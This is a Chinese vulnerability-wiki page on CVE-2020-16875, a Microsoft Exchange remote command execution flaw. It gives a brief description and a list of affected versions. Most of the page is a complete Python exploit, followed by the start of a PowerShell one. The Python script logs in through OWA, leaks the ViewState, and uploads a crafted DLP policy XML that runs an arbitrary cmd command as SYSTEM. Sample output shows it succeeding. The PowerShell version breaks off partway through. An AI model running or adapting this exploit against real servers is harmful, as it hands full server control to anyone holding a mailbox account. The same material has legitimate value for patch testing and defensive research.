<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Microsoft%20Exchange/%EF%BC%88CVE-2020-16875%EF%BC%89Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2020-16875）Microsoft Exchange 远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2020-16875\uff09Microsoft Exchange \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_3" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Microsoft%20SharePoint/%EF%BC%88CVE-2019-0604%EF%BC%89Microsoft%20SharePoint%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Microsoft%20SharePoint/%EF%BC%88CVE-2019-0604%EF%BC%89Microsoft%20SharePoint%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-0604）Microsoft SharePoint 远程代码执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2020-0688%EF%BC%89Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2020-0688%EF%BC%89Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-0688）Microsoft Exchange 远程命令执行漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2020-16875microsoft-exchange">（CVE-2020-16875）Microsoft Exchange 远程命令执行漏洞<a class="headerlink" href="#cve-2020-16875microsoft-exchange" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>有安全人员公开了Exchange
Server远程代码执行漏洞（CVE-2020-16875）的利用程序，此漏洞为微软在9月8日例行月度安全更新中披露；Microsoft
Exchange在Internet
Explorer处理内存中的对象时存在该漏洞。利用此漏洞需要具有以某个Exchange角色进行身份验证的用户权限。</p>
<p>攻击者可通过向受影响的Exchange服务器发送包含特殊的cmdlet参数的邮件来触发此漏洞，成功利用此漏洞的攻击者可在受影响的系统上以system权限执行任意代码。</p>
<h3 id="_2">利用条件<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
<p>需要一个Exchange用户账号</p>
<h2 id="_3">二、漏洞影响<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>Microsoft:Exchange_server_2016: cu16/cu17</p>
<p>Microsoft:Exchange_server_2019: cu5/cu6</p>
<h2 id="_4">三、复现过程<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>需要一个Exchange用户账号。就能在Exchange服务器上执行任意命令。</p>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<blockquote>
<p>CVE-2020-16875.py</p>
</blockquote>
<p><img alt="1.png" src="../resource/%28CVE-2020-16875%29MicrosoftExchange%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="sd">Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution Vulnerability</span>
<span class="sd">Patch: https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-16875</span>

<span class="sd"># Notes:</span>

<span class="sd">The (ab)user needs the &quot;Data Loss Prevention&quot; role assigned and if performing the attack over the ecp interface (this poc) then the user will need an active mailbox.</span>

<span class="sd">[PS] C:\Windows\system32&gt;New-RoleGroup -Name &quot;dlp users&quot; -Roles &quot;Data Loss Prevention&quot; -Members &quot;harrym&quot;</span>

<span class="sd">Name      AssignedRoles          RoleAssignments                  ManagedBy</span>
<span class="sd">----      -------------          ---------------                  ---------</span>
<span class="sd">dlp users {Data Loss Prevention} {Data Loss Prevention-dlp users} {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/test}</span>

<span class="sd">[PS] C:\Windows\system32&gt;Get-RoleGroup &quot;dlp users&quot; | Format-List</span>

<span class="sd">RunspaceId                  : 098e1140-30e3-4144-8028-2174fdb43b85</span>
<span class="sd">ManagedBy                   : {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/test}</span>
<span class="sd">RoleAssignments             : {Data Loss Prevention-dlp users}</span>
<span class="sd">Roles                       : {Data Loss Prevention}</span>
<span class="sd">DisplayName                 :</span>
<span class="sd">ExternalDirectoryObjectId   :</span>
<span class="sd">Members                     : {exchangedemo.com/Users/Harry Mull}</span>
<span class="sd">SamAccountName              : dlp users</span>
<span class="sd">Description                 :</span>
<span class="sd">RoleGroupType               : Standard</span>
<span class="sd">LinkedGroup                 :</span>
<span class="sd">Capabilities                : {}</span>
<span class="sd">LinkedPartnerGroupId        :</span>
<span class="sd">LinkedPartnerOrganizationId :</span>
<span class="sd">Identity                    : exchangedemo.com/Microsoft Exchange Security Groups/dlp users</span>
<span class="sd">IsValid                     : True</span>
<span class="sd">ExchangeVersion             : 0.10 (14.0.100.0)</span>
<span class="sd">Name                        : dlp users</span>
<span class="sd">DistinguishedName           : CN=dlp users,OU=Microsoft Exchange Security Groups,DC=exchangedemo,DC=com</span>
<span class="sd">Guid                        : fa5c8458-8255-4ffd-b128-2a66bf9dbfd6</span>
<span class="sd">ObjectCategory              : exchangedemo.com/Configuration/Schema/Group</span>
<span class="sd">ObjectClass                 : {top, group}</span>
<span class="sd">WhenChanged                 : 6/12/2020 11:29:31 PM</span>
<span class="sd">WhenCreated                 : 6/12/2020 11:29:31 PM</span>
<span class="sd">WhenChangedUTC              : 6/12/2020 3:29:31 PM</span>
<span class="sd">WhenCreatedUTC              : 6/12/2020 3:29:31 PM</span>
<span class="sd">OrganizationId              :</span>
<span class="sd">Id                          : exchangedemo.com/Microsoft Exchange Security Groups/dlp users</span>
<span class="sd">OriginatingServer           : DEAD01.exchangedemo.com</span>
<span class="sd">ObjectState                 : Changed</span>

<span class="sd"># Example:</span>

<span class="sd">researcher@incite:~$ ./poc.py</span>
<span class="sd">(+) usage: ./poc.py &lt;target&gt; &lt;user:pass&gt; &lt;cmd&gt;</span>
<span class="sd">(+) eg: ./poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaint</span>

<span class="sd">researcher@incite:~$ ./poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaint</span>
<span class="sd">(+) logged in as harrym@exchangedemo.com</span>
<span class="sd">(+) found the __viewstate: /wEPDwUILTg5MDAzMDFkZFAeyPS7/eBJ4lPNRNPBjm8QiWLWnirQ1vsGlSyjVxa5</span>
<span class="sd">(+) executed mspaint as SYSTEM!</span>
<span class="sd">&quot;&quot;&quot;</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">string</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">urllib3</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>


<span class="k">def</span><span class="w"> </span><span class="nf">random_string</span><span class="p">(</span><span class="n">str_len</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
    <span class="n">letters</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span>
    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">letters</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">str_len</span><span class="p">))</span>


<span class="k">def</span><span class="w"> </span><span class="nf">get_xml</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
    <span class="k">return</span> <span class="s2">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="s2">&lt;dlpPolicyTemplates&gt;</span>
<span class="s2">  &lt;dlpPolicyTemplate id=&quot;F7C29AEC-A52D-4502-9670-141424A83FAB&quot; mode=&quot;Audit&quot; state=&quot;Enabled&quot; version=&quot;15.0.2.0&quot;&gt;</span>
<span class="s2">    &lt;contentVersion&gt;4&lt;/contentVersion&gt;</span>
<span class="s2">    &lt;publisherName&gt;si&lt;/publisherName&gt;</span>
<span class="s2">    &lt;name&gt;</span>
<span class="s2">      &lt;localizedString lang=&quot;en&quot;&gt;&lt;/localizedString&gt;</span>
<span class="s2">    &lt;/name&gt;</span>
<span class="s2">    &lt;description&gt;</span>
<span class="s2">      &lt;localizedString lang=&quot;en&quot;&gt;&lt;/localizedString&gt;</span>
<span class="s2">    &lt;/description&gt;</span>
<span class="s2">    &lt;keywords&gt;&lt;/keywords&gt;</span>
<span class="s2">    &lt;ruleParameters&gt;&lt;/ruleParameters&gt;</span>
<span class="s2">    &lt;policyCommands&gt;</span>
<span class="s2">      &lt;commandBlock&gt;</span>
<span class="s2">        &lt;![CDATA[ $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName=&quot;cmd&quot;;$i.Arguments=&quot;/c </span><span class="si">%s</span><span class="s2">&quot;;$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start() ]]&gt;</span>
<span class="s2">      &lt;/commandBlock&gt;</span>
<span class="s2">    &lt;/policyCommands&gt;</span>
<span class="s2">    &lt;policyCommandsResources&gt;&lt;/policyCommandsResources&gt;</span>
<span class="s2">  &lt;/dlpPolicyTemplate&gt;</span>
<span class="s2">&lt;/dlpPolicyTemplates&gt;&quot;&quot;&quot;</span> <span class="o">%</span> <span class="n">c</span>


<span class="k">def</span><span class="w"> </span><span class="nf">trigger_rce</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">vs</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
    <span class="n">f</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;__VIEWSTATE&#39;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">vs</span><span class="p">),</span>
        <span class="s1">&#39;ctl00$ResultPanePlaceHolder$senderBtn&#39;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="s2">&quot;ResultPanePlaceHolder_ButtonsPanel_btnNext&quot;</span><span class="p">),</span>
        <span class="s1">&#39;ctl00$ResultPanePlaceHolder$contentContainer$name&#39;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">random_string</span><span class="p">()),</span>
        <span class="s1">&#39;ctl00$ResultPanePlaceHolder$contentContainer$upldCtrl&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s2">&quot;dlprce.xml&quot;</span><span class="p">,</span> <span class="n">get_xml</span><span class="p">(</span><span class="n">cmd</span><span class="p">)),</span>
    <span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;https://</span><span class="si">%s</span><span class="s2">/ecp/DLPPolicy/ManagePolicyFromISV.aspx&quot;</span> <span class="o">%</span> <span class="n">t</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">f</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="k">assert</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">,</span> <span class="s2">&quot;(-) failed to trigger rce!&quot;</span>


<span class="k">def</span><span class="w"> </span><span class="nf">leak_viewstate</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">s</span><span class="p">):</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;https://</span><span class="si">%s</span><span class="s2">/ecp/DLPPolicy/ManagePolicyFromISV.aspx&quot;</span> <span class="o">%</span> <span class="n">t</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">__VIEWSTATE</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">__VIEWSTATE</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">(.*)</span><span class="se">\&quot;</span><span class="s2"> /&gt;&quot;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">assert</span> <span class="n">match</span> <span class="o">!=</span> <span class="kc">None</span><span class="p">,</span> <span class="s2">&quot;(-) couldn&#39;t leak the __viewstate!&quot;</span>
    <span class="k">return</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>


<span class="k">def</span><span class="w"> </span><span class="nf">log_in</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">usr</span><span class="p">,</span> <span class="n">pwd</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">d</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;destination&quot;</span><span class="p">:</span> <span class="s2">&quot;https://</span><span class="si">%s</span><span class="s2">/owa&quot;</span> <span class="o">%</span> <span class="n">t</span><span class="p">,</span>
        <span class="s2">&quot;flags&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">usr</span><span class="p">,</span>
        <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="n">pwd</span>
    <span class="p">}</span>
    <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;https://</span><span class="si">%s</span><span class="s2">/owa/auth.owa&quot;</span> <span class="o">%</span> <span class="n">t</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">d</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="k">assert</span> <span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s1">&#39;X-OWA-CANARY&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">None</span><span class="p">,</span> <span class="s2">&quot;(-) couldn&#39;t leak the csrf canary!&quot;</span>
    <span class="k">return</span> <span class="n">s</span>


<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">usr</span><span class="p">,</span> <span class="n">pwd</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">log_in</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">usr</span><span class="p">,</span> <span class="n">pwd</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) logged in as </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">usr</span><span class="p">)</span>
    <span class="n">vs</span> <span class="o">=</span> <span class="n">leak_viewstate</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) found the __viewstate: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">vs</span><span class="p">)</span>
    <span class="n">trigger_rce</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">vs</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) executed </span><span class="si">%s</span><span class="s2"> as SYSTEM!&quot;</span> <span class="o">%</span> <span class="n">cmd</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) usage: </span><span class="si">%s</span><span class="s2"> &lt;target&gt; &lt;user:pass&gt; &lt;cmd&gt;&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) eg: </span><span class="si">%s</span><span class="s2"> 192.168.75.142 harrym@exchangedemo.com:user123### mspaint&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">trgt</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">assert</span> <span class="s2">&quot;:&quot;</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="s2">&quot;(-) you need a user and password!&quot;</span>
    <span class="n">usr</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">pwd</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">cmd</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
    <span class="n">main</span><span class="p">(</span><span class="n">trgt</span><span class="p">,</span> <span class="n">usr</span><span class="p">,</span> <span class="n">pwd</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
<span class="n">powershell版本</span><span class="err">：</span>
<span class="c1"># Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution Vulnerability</span>
<span class="c1"># Patch: https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-16875</span>
<span class="c1">#</span>
<span class="c1"># Notes:</span>
<span class="c1">#</span>
<span class="c1"># The (ab)user needs the &quot;Data Loss Prevention&quot; role assigned</span>
<span class="c1"># [PS] C:\Windows\system32&gt;New-RoleGroup -Name &quot;dlp users&quot; -Roles &quot;Data Loss Prevention&quot; -Members &quot;harrym&quot;</span>
<span class="c1">#</span>
<span class="c1"># Name      AssignedRoles          RoleAssignments                  ManagedBy</span>
<span class="c1"># ----      -------------          ---------------                  ---------</span>
<span class="c1"># dlp users {Data Loss Prevention} {Data Loss Prevention-dlp users} {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/test}</span>
<span class="c1">#</span>
<span class="c1">#</span>
<span class="c1"># [PS] C:\Windows\system32&gt;Get-RoleGroup &quot;dlp users&quot; | Format-List</span>
<span class="c1">#</span>
<span class="c1"># RunspaceId                  : 098e1140-30e3-4144-8028-2174fdb43b85</span>
<span class="c1"># ManagedBy                   : {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/test}</span>
<span class="c1"># RoleAssignments             : {Data Loss Prevention-dlp users}</span>
<span class="c1"># Roles                       : {Data Loss Prevention}</span>
<span class="c1"># DisplayName                 :</span>
<span class="c1"># ExternalDirectoryObjectId   :</span>
<span class="c1"># Members                     : {exchangedemo.com/Users/Harry Mull}</span>
<span class="c1"># SamAccountName              : dlp users</span>
<span class="c1"># Description                 :</span>
<span class="c1"># RoleGroupType               : Standard</span>
<span class="c1"># LinkedGroup                 :</span>
<span class="c1"># Capabilities                : {}</span>
<span class="c1"># LinkedPartnerGroupId        :</span>
<span class="c1"># LinkedPartnerOrganizationId :</span>
<span class="c1"># Identity                    : exchangedemo.com/Microsoft Exchange Security Groups/dlp users</span>
<span class="c1"># IsValid                     : True</span>
<span class="c1"># ExchangeVersion             : 0.10 (14.0.100.0)</span>
<span class="c1"># Name                        : dlp users</span>
<span class="c1"># DistinguishedName           : CN=dlp users,OU=Microsoft Exchange Security Groups,DC=exchangedemo,DC=com</span>
<span class="c1"># Guid                        : fa5c8458-8255-4ffd-b128-2a66bf9dbfd6</span>
<span class="c1"># ObjectCategory              : exchangedemo.com/Configuration/Schema/Group</span>
<span class="c1"># ObjectClass                 : {top, group}</span>
<span class="c1"># WhenChanged                 : 6/12/2020 11:29:31 PM</span>
<span class="c1"># WhenCreated                 : 6/12/2020 11:29:31 PM</span>
<span class="c1"># WhenChangedUTC              : 6/12/2020 3:29:31 PM</span>
<span class="c1"># WhenCreatedUTC              : 6/12/2020 3:29:31 PM</span>
<span class="c1"># OrganizationId              :</span>
<span class="c1"># Id                          : exchangedemo.com/Microsoft Exchange Security Groups/dlp users</span>
<span class="c1"># OriginatingServer           : DEAD01.exchangedemo.com</span>
<span class="c1"># ObjectState                 : Changed</span>
<span class="c1">#</span>
<span class="c1"># Example:</span>
<span class="c1">#</span>
<span class="c1"># PS C:\Users\researcher&gt; .\poc.ps1 -server WIN-0K4AOM2JIN6.exchangedemo.com -usr harrym@exchangedemo.com -pwd user123### -cmd mspaint</span>
<span class="c1"># (+) targeting WIN-0K4AOM2JIN6.exchangedemo.com with harrym@exchangedemo.com:user123###</span>
<span class="c1"># (+) executed mspaint as SYSTEM!</span>
<span class="c1"># PS C:\Users\researcher&gt;</span>

<span class="n">param</span> <span class="p">(</span>
    <span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="o">=</span><span class="err">$</span><span class="n">true</span><span class="p">)][</span><span class="n">string</span><span class="p">]</span><span class="err">$</span><span class="n">server</span><span class="p">,</span>
    <span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="o">=</span><span class="err">$</span><span class="n">true</span><span class="p">)][</span><span class="n">string</span><span class="p">]</span><span class="err">$</span><span class="n">usr</span><span class="p">,</span>
    <span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="o">=</span><span class="err">$</span><span class="n">true</span><span class="p">)][</span><span class="n">string</span><span class="p">]</span><span class="err">$</span><span class="n">pwd</span><span class="p">,</span>
    <span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="err">$</span><span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;mspaint&quot;</span>
<span class="p">)</span>

<span class="n">Function</span> <span class="n">Get</span><span class="o">-</span><span class="n">RandomAlphanumericString</span> <span class="p">{</span>
    <span class="p">[</span><span class="n">CmdletBinding</span><span class="p">()]</span>
    <span class="n">Param</span> <span class="p">(</span>
        <span class="p">[</span><span class="nb">int</span><span class="p">]</span> <span class="err">$</span><span class="n">length</span> <span class="o">=</span> <span class="mi">8</span>
    <span class="p">)</span>
    <span class="n">Process</span><span class="p">{</span>
        <span class="n">Write</span><span class="o">-</span><span class="n">Output</span> <span class="p">(</span> <span class="o">-</span><span class="n">join</span> <span class="p">((</span><span class="mh">0x30</span><span class="o">.</span><span class="mf">.0</span><span class="n">x39</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span> <span class="mh">0x41</span><span class="o">.</span><span class="mf">.0</span><span class="n">x5A</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span> <span class="mh">0x61</span><span class="o">.</span><span class="mf">.0</span><span class="n">x7A</span><span class="p">)</span> <span class="o">|</span> <span class="n">Get</span><span class="o">-</span><span class="n">Random</span> <span class="o">-</span><span class="n">Count</span> <span class="err">$</span><span class="n">length</span>  <span class="o">|</span> <span class="o">%</span> <span class="p">{[</span><span class="n">char</span><span class="p">]</span><span class="err">$</span><span class="n">_</span><span class="p">})</span> <span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="n">function</span> <span class="n">Exploit</span><span class="o">-</span><span class="n">Exchange</span> <span class="p">{</span>
    <span class="n">Param</span> <span class="p">(</span>
        <span class="p">[</span><span class="n">string</span><span class="p">]</span> <span class="err">$</span><span class="n">server</span><span class="p">,</span>
        <span class="p">[</span><span class="n">string</span><span class="p">]</span> <span class="err">$</span><span class="n">usr</span><span class="p">,</span>
        <span class="p">[</span><span class="n">string</span><span class="p">]</span> <span class="err">$</span><span class="n">pwd</span><span class="p">,</span>
        <span class="p">[</span><span class="n">string</span><span class="p">]</span> <span class="err">$</span><span class="n">cmd</span>
    <span class="p">)</span>
    <span class="s2">&quot;(+) targeting $server with $</span><span class="si">{usr}</span><span class="s2">:$pwd&quot;</span>
    <span class="err">$</span><span class="n">securepwd</span> <span class="o">=</span> <span class="n">ConvertTo</span><span class="o">-</span><span class="n">SecureString</span> <span class="err">$</span><span class="n">pwd</span> <span class="o">-</span><span class="n">AsPlainText</span> <span class="o">-</span><span class="n">Force</span>
    <span class="err">$</span><span class="n">creds</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">System</span><span class="o">.</span><span class="n">Management</span><span class="o">.</span><span class="n">Automation</span><span class="o">.</span><span class="n">PSCredential</span> <span class="o">-</span><span class="n">ArgumentList</span> <span class="p">(</span><span class="err">$</span><span class="n">usr</span><span class="p">,</span> <span class="err">$</span><span class="n">securepwd</span><span class="p">)</span>
